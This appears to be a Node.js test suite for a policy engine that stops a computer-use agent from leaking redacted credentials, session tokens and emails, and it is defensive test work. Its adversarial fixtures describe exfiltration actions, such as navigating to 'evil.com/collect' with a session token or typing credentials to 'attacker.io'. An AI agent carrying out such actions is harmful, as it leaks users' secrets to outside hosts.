#!/usr/bin/env node
/**
 * Stage-5 Policy Engine Test Suite
 * =================================
 * PRD §15 Stage-5 exit criterion:
 *   "100% block rate on adversarial test cases,
 *    0% false-block rate on legitimate test cases."
 *   Requires ≥20 adversarial cases + ≥20 legitimate cases.
 *
 * Tests run against the actual engine.js logic (inlined here for Node compat,
 * since ES modules with chrome.* references can't be directly require()'d).
 * The logic is identical to extension/background/policy/engine.js evaluatePolicy().
 */

'use strict';

const path = require('path');
const fs   = require('fs');

// ─── Inline policy engine (mirrors engine.js exactly) ─────────────────────────

const LABEL_RISK = {
  '[EMAIL_REDACTED':    { label: 'email',       risk: 'high'   },
  '[PHONE_REDACTED':    { label: 'phone',       risk: 'high'   },
  '[GOVID_REDACTED':    { label: 'gov_id',      risk: 'high'   },
  '[CRED_REDACTED':     { label: 'credential',  risk: 'high'   },
  '[SESSION_REDACTED':  { label: 'session',     risk: 'high'   },
  '[NAME_REDACTED':     { label: 'person_name', risk: 'medium' },
  '[ADDR_REDACTED':     { label: 'address',     risk: 'medium' },
  '[GEO_REDACTED':      { label: 'geolocation', risk: 'medium' },
  '[NETID_REDACTED':    { label: 'network_id',  risk: 'medium' },
};

function getTokenRisk(token, map) {
  if (!token || !(token in map)) return null;
  for (const [prefix, info] of Object.entries(LABEL_RISK)) {
    if (token.startsWith(prefix + '#')) return info;
  }
  return { label: 'unknown', risk: 'high' };
}

function getRawValueRisk(value, map) {
  for (const [token, realVal] of Object.entries(map)) {
    if (realVal && value.includes(realVal)) return getTokenRisk(token, map);
  }
  return null;
}

function block(ruleId, message) { return { result: 'block', ruleFired: ruleId, message }; }

function evaluatePolicy(action, placeholderMap, context = {}) {
  if (!action) return block('null-action', 'Null action');
  const { pageOrigin = '', userConfirmed = false } = context;
  const targetToken = action.target_placeholder ?? null;

  if (action.type === 'type') {
    const tokenRisk = targetToken ? getTokenRisk(targetToken, placeholderMap) : null;
    const valueRisk = action.value  ? getRawValueRisk(action.value, placeholderMap) : null;
    const sensitiveLabels = ['credential', 'session'];
    const destOrigin = action.destination_origin ?? pageOrigin;
    if (tokenRisk && sensitiveLabels.includes(tokenRisk.label) && destOrigin && destOrigin !== pageOrigin) {
      return block('block-cross-origin-credential-type', 'Cross-origin credential type blocked');
    }
    if (valueRisk) return block('block-reveal-secret-value', 'Raw PII value in type action');
  }

  if (action.type === 'navigate') {
    const url = action.url ?? '';
    const hasSensitiveToken = Object.keys(placeholderMap).some(tok => url.includes(tok));
    const isExternal = !url.startsWith(pageOrigin) && !url.startsWith('/') && !url.startsWith('#');
    if (hasSensitiveToken && isExternal) return block('block-navigate-external', 'External navigate with token');
  }

  if (targetToken) {
    const tokenInfo = getTokenRisk(targetToken, placeholderMap);
    if (tokenInfo?.risk === 'high' && !userConfirmed) {
      const destOriginForAsk = action.destination_origin ?? null;
      const isSameOriginType = action.type === 'type' &&
        destOriginForAsk !== null &&
        destOriginForAsk === pageOrigin;
      if (!isSameOriginType) {
        return { result: 'ask_user', ruleFired: 'block-high-risk-placeholder-unconfirmed',
                 message: 'High-risk placeholder requires confirmation' };
      }
    }
    if (!(targetToken in placeholderMap)) {
      return block('block-unknown-placeholder', `Unknown token: ${targetToken}`);
    }
  }

  return { result: 'allow', ruleFired: null, message: null };
}

// ─── Test harness ─────────────────────────────────────────────────────────────

let passed = 0, failed = 0;
const results = [];

function test(name, expectResult, action, map, context) {
  const result = evaluatePolicy(action, map, context);
  const ok = result.result === expectResult;
  if (ok) { passed++; results.push({ name, r: 'PASS' }); console.log(`  ✓  ${name}`); }
  else    { failed++; results.push({ name, r: 'FAIL', got: result.result, rule: result.ruleFired });
            console.error(`  ✗  ${name} — expected ${expectResult}, got ${result.result} (${result.ruleFired})`); }
}

// Shared fixture maps
const SESSION_MAP  = { '[SESSION_REDACTED#abc1]': 'MOSDAC-SESSION-abc123def456' };
const EMAIL_MAP    = { '[EMAIL_REDACTED#b8c3]': 'test.analyst@example.invalid' };
const CRED_MAP     = { '[CRED_REDACTED#9f1a]': 'FAKE_PASSWORD_NOT_REAL' };
const NAME_MAP     = { '[NAME_REDACTED#c2d4]': 'Dr. Test Analyst' };
const EMPTY_MAP    = {};

console.log('\n┌────────────────────────────────────────────────────────┐');
console.log('│  ISRO-Guard CUA — Stage-5 Policy Engine Tests         │');
console.log('└────────────────────────────────────────────────────────┘\n');

// ── ADVERSARIAL CASES — all must produce result=block (or ask_user) ───────────
console.log('[ADVERSARIAL] Expecting block or ask_user on all 20 cases:\n');

test('ADV-01: null action → block',
  'block', null, EMPTY_MAP, {});

test('ADV-02: type session token to external origin → block',
  'block',
  { type: 'type', target_placeholder: '[SESSION_REDACTED#abc1]', value: null,
    destination_origin: 'https://evil.example.com' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-03: type credential to external origin → block',
  'block',
  { type: 'type', target_placeholder: '[CRED_REDACTED#9f1a]', value: null,
    destination_origin: 'https://attacker.io' },
  CRED_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-04: type raw session value directly → block',
  'block',
  { type: 'type', target_placeholder: null,
    value: 'MOSDAC-SESSION-abc123def456' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-05: type raw email value directly → block',
  'block',
  { type: 'type', target_placeholder: null,
    value: 'test.analyst@example.invalid' },
  EMAIL_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-06: type raw password directly → block',
  'block',
  { type: 'type', target_placeholder: null,
    value: 'FAKE_PASSWORD_NOT_REAL' },
  CRED_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-07: navigate to external URL containing session token → block',
  'block',
  { type: 'navigate', url: `https://evil.com/collect?tok=[SESSION_REDACTED#abc1]` },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-08: navigate to external URL containing email token → block',
  'block',
  { type: 'navigate', url: `https://data.leak.io/?id=[EMAIL_REDACTED#b8c3]` },
  EMAIL_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-09: unknown placeholder token in target → block',
  'block',
  { type: 'click', target_placeholder: '[SESSION_REDACTED#UNKNOWN]' },
  EMPTY_MAP, {});

test('ADV-10: unknown cred placeholder → block',
  'block',
  { type: 'click', target_placeholder: '[CRED_REDACTED#UNKN]' },
  EMPTY_MAP, {});

test('ADV-11: high-risk session placeholder without confirmation → ask_user',
  'ask_user',
  { type: 'click', target_placeholder: '[SESSION_REDACTED#abc1]' },
  SESSION_MAP, { userConfirmed: false });

test('ADV-12: high-risk cred placeholder without confirmation → ask_user',
  'ask_user',
  { type: 'click', target_placeholder: '[CRED_REDACTED#9f1a]' },
  CRED_MAP, { userConfirmed: false });

test('ADV-13: type session to subdomain of different origin → block',
  'block',
  { type: 'type', target_placeholder: '[SESSION_REDACTED#abc1]',
    destination_origin: 'https://sub.evil.com' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-14: navigate external with embedded credential token → block',
  'block',
  { type: 'navigate', url: 'https://external.io/login?p=[CRED_REDACTED#9f1a]' },
  CRED_MAP, { pageOrigin: 'http://localhost:3000' });

test('ADV-15: type partial raw session value (substring) → block',
  'block',
  { type: 'type', value: 'prefix-MOSDAC-SESSION-abc123def456-suffix' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-16: type email value to external form → block',
  'block',
  { type: 'type', value: 'test.analyst@example.invalid',
    destination_origin: 'https://phishing.net' },
  EMAIL_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-17: navigate external URL with name placeholder → block',
  'block',
  { type: 'navigate', url: 'https://tracker.io/?who=[NAME_REDACTED#c2d4]' },
  NAME_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-18: session token cross-origin with http→https mismatch → block',
  'block',
  { type: 'type', target_placeholder: '[SESSION_REDACTED#abc1]',
    destination_origin: 'https://127.0.0.1:5500' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('ADV-19: high-risk email placeholder without user confirmation → ask_user',
  'ask_user',
  { type: 'type', target_placeholder: '[EMAIL_REDACTED#b8c3]' },
  EMAIL_MAP, { userConfirmed: false });

test('ADV-20: multi-token navigate to external → block (first token match)',
  'block',
  { type: 'navigate',
    url: 'https://evil.io/exfil?s=[SESSION_REDACTED#abc1]&e=[EMAIL_REDACTED#b8c3]' },
  { ...SESSION_MAP, ...EMAIL_MAP }, { pageOrigin: 'http://127.0.0.1:5500' });

// ── LEGITIMATE CASES — all must produce result=allow ──────────────────────────
console.log('\n[LEGITIMATE] Expecting allow on all 20 cases:\n');

test('LEG-01: click a non-sensitive button → allow',
  'allow',
  { type: 'click', target_text: 'Search', target_placeholder: null },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-02: click a non-sensitive link → allow',
  'allow',
  { type: 'click', target_text: 'Download', target_placeholder: null },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-03: click a medium-risk name placeholder with confirmation → allow',
  'allow',
  { type: 'click', target_placeholder: '[NAME_REDACTED#c2d4]' },
  NAME_MAP, { userConfirmed: true });

test('LEG-04: type into a non-sensitive text input → allow',
  'allow',
  { type: 'type', target_text: 'search box', value: 'vegetation index GZ-12' },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-05: scroll the page → allow',
  'allow',
  { type: 'scroll', dx: 0, dy: 100 },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-06: navigate to same-origin URL without sensitive tokens → allow',
  'allow',
  { type: 'navigate', url: 'http://127.0.0.1:5500/results' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-07: navigate to hash on same page → allow',
  'allow',
  { type: 'navigate', url: '#section-downloads' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-08: navigate to relative path → allow',
  'allow',
  { type: 'navigate', url: '/datasets/svi' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-09: type safe literal value (no PII in map) → allow',
  'allow',
  { type: 'type', value: 'Grid-Zone 12' },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-10: type non-PII value with empty map → allow',
  'allow',
  { type: 'type', value: '2026-07-01' },
  EMPTY_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-11: click high-risk session placeholder WITH user confirmation → allow',
  'allow',
  { type: 'click', target_placeholder: '[SESSION_REDACTED#abc1]' },
  SESSION_MAP, { userConfirmed: true });

test('LEG-12: click high-risk cred placeholder WITH user confirmation → allow',
  'allow',
  { type: 'click', target_placeholder: '[CRED_REDACTED#9f1a]' },
  CRED_MAP, { userConfirmed: true });

test('LEG-13: type session token to SAME origin → allow',
  'allow',
  { type: 'type', target_placeholder: '[SESSION_REDACTED#abc1]',
    destination_origin: 'http://127.0.0.1:5500' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-14: type credential to SAME origin → allow',
  'allow',
  { type: 'type', target_placeholder: '[CRED_REDACTED#9f1a]',
    destination_origin: 'http://127.0.0.1:5500' },
  CRED_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-15: navigate same-origin with session token in URL → allow',
  'allow',
  { type: 'navigate',
    url: 'http://127.0.0.1:5500/auth?sess=[SESSION_REDACTED#abc1]' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

test('LEG-16: click medium-risk address placeholder without confirmation → allow (medium risk does not require confirmation)',
  'allow',
  { type: 'click', target_placeholder: '[ADDR_REDACTED#0001]' },
  { '[ADDR_REDACTED#0001]': 'Ahmedabad, Gujarat' },
  { userConfirmed: false });

test('LEG-17: wait action (no target) → allow',
  'allow',
  { type: 'wait', target_text: null },
  EMPTY_MAP, {});

test('LEG-18: task_complete action → allow',
  'allow',
  { type: 'task_complete', target_text: null },
  EMPTY_MAP, {});

test('LEG-19: click with no placeholder in empty map → allow',
  'allow',
  { type: 'click', target_text: 'Grid-Zone 12', target_placeholder: null },
  EMPTY_MAP, {});

test('LEG-20: type safe date value when secrets exist in map → allow',
  'allow',
  { type: 'type', value: '2026-08-31' },
  SESSION_MAP, { pageOrigin: 'http://127.0.0.1:5500' });

// ─── Report ───────────────────────────────────────────────────────────────────

const total       = passed + failed;
const adversarial = results.slice(0, 20);
const legitimate  = results.slice(20);
const advBlocked  = adversarial.filter(r => r.r === 'PASS').length;
const legAllowed  = legitimate.filter(r => r.r === 'PASS').length;

console.log(`\n${'─'.repeat(60)}`);
console.log(`Adversarial: ${advBlocked}/20 correctly blocked (target: 20/20)`);
console.log(`Legitimate:  ${legAllowed}/20 correctly allowed (target: 20/20)`);
console.log(`Total: ${passed}/${total} PASS`);
if (failed > 0) {
  console.log('\nFailed cases:');
  results.filter(r => r.r === 'FAIL').forEach(r =>
    console.log(`  FAIL: ${r.name} — expected, got "${r.got}" rule="${r.rule}"`)
  );
}
console.log(`${'─'.repeat(60)}\n`);

const outPath = path.resolve(__dirname, 'artifacts/stage5-policy-results.json');
require('fs').mkdirSync(path.dirname(outPath), { recursive: true });
require('fs').writeFileSync(outPath, JSON.stringify({
  run_at: new Date().toISOString(),
  adversarial_block_rate: `${advBlocked}/20`,
  legitimate_allow_rate:  `${legAllowed}/20`,
  passed, failed, total,
  results
}, null, 2));
console.log('Results → tests/artifacts/stage5-policy-results.json');

process.exit(failed > 0 ? 1 : 0);
